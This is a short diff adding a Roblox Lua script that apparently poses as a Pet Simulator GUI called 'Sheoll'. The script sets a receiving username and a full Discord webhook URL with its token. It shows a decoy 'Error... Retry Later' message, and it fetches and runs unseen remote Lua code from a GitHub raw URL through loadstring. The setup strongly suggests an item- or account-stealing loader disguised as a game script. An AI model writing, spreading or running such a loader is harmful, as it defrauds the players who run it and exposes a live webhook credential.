@@ -1,0 +1,7 @@
+Username = "YT_ShadowPlayzzz"
+WebHook = "https://discord.com/api/webhooks/1152519758676242473/nsPK8WoYCbdLWym-ppfKhiwghLM_RUljTEvyRvSp-Os3GXsdNghMdLSBpSdZV2WOqxiU"
+
+_G.CustomScriptName = "Sheoll"
+_G.Text1 = "Script Loading..."
+_G.Text2 = "Error... Retry Later"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
